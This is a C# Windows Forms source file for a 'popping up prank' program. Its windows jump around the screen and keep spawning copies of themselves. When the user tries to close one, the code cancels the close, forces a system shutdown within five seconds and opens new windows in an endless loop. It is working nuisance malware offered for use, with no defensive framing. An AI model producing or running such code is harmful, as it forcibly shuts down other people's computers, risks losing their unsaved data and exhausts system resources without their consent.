using System.Diagnostics;

namespace popping_up_prank
{
    public partial class Form1 : Form
    {
        private int windows = 0;

        public Form1()
        {
            InitializeComponent();
            this.pictureBox.TabIndex = 2137;
            this.pictureBox.TabStop = false;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            new Thread(new ThreadStart(this.Thread)).Start();
        }
        private void Thread()
        {
            while (true)
            {
                System.Threading.Thread.Sleep(1000);
                this.Invoke((Delegate)(() => this.RandomizePosition()));
            }
        }
        private void RandomizePosition()
        {
            Random random = new Random();
            this.Location = new Point((int)(random.NextDouble() * (double)Screen.PrimaryScreen.Bounds.Width) - this.Width / 2, (int)(random.NextDouble() * (double)Screen.PrimaryScreen.Bounds.Height) - this.Height / 2);
            if (random.Next(0, 10) >= 5)
                return;

            if (this.windows >= 35)
            {
                return;
            }
            new Form1().Show();
            this.windows += 1;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            Process.Start("shutdown", "/s /t 5");
            while (true)
                new Form1().Show();
        }
    }
}
